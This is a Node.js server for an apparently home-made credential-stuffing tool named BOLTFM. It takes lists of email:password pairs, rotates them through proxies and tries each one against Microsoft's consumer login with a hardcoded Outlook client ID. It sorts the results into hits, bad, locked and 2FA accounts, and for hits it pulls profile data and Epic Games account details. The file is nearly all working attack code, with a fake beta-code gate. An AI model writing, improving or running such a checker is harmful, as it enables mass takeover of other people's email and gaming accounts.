const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = 3000;
let isRunning = false, isPaused = false;
let stats = { hits: 0, bad: 0, locked: 0, cpm: 0, checked: 0, total: 0 };
let timerStart = 0;

app.use(express.json());
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/api/hwid', (req, res) => {
    let hwid = Array.from({length:32}, () => 'ABCDEF0123456789'[Math.floor(Math.random()*16)]).join('');
    res.json({ hwid });
});
app.post('/api/login', (req, res) => {
    const { beta } = req.body;
    res.json({ success: !!(beta && beta.length >= 5), message: beta?.length >= 5 ? "G'day!" : "Need code" });
});

io.on('connection', (socket) => {
    socket.on('start_scan', async ({ combos, proxyList, threads = 15, timeout = 15000 }) => {
        if (isRunning) return;
        isRunning = isPaused = false;
        const accounts = combos.split('\n').filter(l => l.includes(':')).slice(0, 1000);
        const proxies = (proxyList || '').split('\n').filter(l => l.includes(':'));
        
        stats = { hits: 0, bad: 0, locked: 0, cpm: 0, checked: 0, total: accounts.length };
        timerStart = Date.now();
        socket.emit('scan_started', { total: stats.total });
        
        for (let i = 0; i < accounts.length && isRunning; i++) {
            while (isPaused && isRunning) await new Promise(r => setTimeout(r, 500));
            if (!isRunning) break;
            
            const [email, password] = accounts[i].split(':');
            socket.emit('scan_status', { status: 'checking', email: email.slice(0,3)+'***' });
            
            const result = await checkCombo(email, password.trim(), proxies[i % proxies.length], timeout);
            stats.checked++;
            
            if (result.status === 'hit') { stats.hits++; socket.emit('hit_found', result); }
            else if (result.status === 'bad') stats.bad++;
            else if (result.status === 'locked' || result.status === '2fa') stats.locked++;
            
            stats.cpm = Math.floor(stats.checked / ((Date.now() - timerStart)/60000 || 0.01));
            socket.emit('stats_update', stats);
        }
        isRunning = false;
        socket.emit('scan_complete', stats);
    });
    
    socket.on('stop_scan', () => { isRunning = false; socket.emit('scan_stopped', stats); });
    socket.on('pause_scan', () => { isPaused = !isPaused; socket.emit('scan_paused', { paused: isPaused }); });
});

async function checkCombo(email, password, proxy, timeout = 15000) {
    const session = axios.create();
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com'
    };
    
    try {
        const loginUrl = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?' + 
            'client_id=817513d8-4bfb-4c91-9555-d85586d526bf&redirect_uri=https://outlook.office.com/' +
            '&scope=https://outlook.office.com/M365.Access&response_type=code&haschrome=1&login_hint=' + email;
        
        const data = new URLSearchParams({
            login: email, loginfmt: email, passwd: password, type: 11, LoginOptions: 3, i13: 0, PPSX: 'Passpo'
        });
        
        const opts = { headers, timeout, maxRedirects: 0, validateStatus: s => s < 400 };
        if (proxy) opts.proxy = parseProxy(proxy);
        
        const resp = await session.post(loginUrl, data, opts).catch(e => e.response);
        const text = (resp?.data || '').toString().toLowerCase();
        
        if (!resp?.data?.access_token) {
            if (text.includes('incorrect') || text.includes('doesn') || text.length < 100) 
                return { status: 'bad', email, reason: 'Invalid credentials' };
            if (text.includes('two-factor') || text.includes('verify')) 
                return { status: '2fa', email, service: 'Microsoft' };
            if (text.includes('locked') || text.includes('blocked')) 
                return { status: 'locked', email, reason: 'Account locked' };
            return { status: 'bad', email, reason: 'Auth failed' };
        }
        
        const token = resp.data.access_token;
        const authHdr = { ...headers, 'Authorization': 'Bearer ' + token };
        
        const profile = await session.get(
            'https://substrate.office.com/profileb2/v2.0/me/V1Profile',
            { headers: authHdr, timeout }
        ).catch(() => ({})).then(r => r?.data || {});
        
        const epic = await session.post(
            'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/v1/account',
            { email },
            { headers: { ...authHdr, 'Content-Type': 'application/json' }, timeout }
        ).catch(() => ({})).then(r => r?.data || {});
        
        if (profile.email || epic.id) return {
            status: 'hit', email, service: epic.id ? 'Microsoft + Epic' : 'Hotmail',
            country: profile.preferredDataLocation || 'Unknown',
            displayName: profile.displayName || epic.displayName || '',
            id: epic.id || profile.id || ''
        };
        
        return { status: 'hit', email, service: 'Hotmail', country: profile.preferredDataLocation || 'Unknown' };
    } catch (e) {
        return { status: 'bad', email, reason: e.message };
    }
}

function parseProxy(proxy) {
    if (!proxy) return {};
    const [host, port] = proxy.split(':');
    return { host, port: parseInt(port) };
}

server.listen(PORT, '0.0.0.0', () => {
    console.log('BOLTFM running on port', PORT);
});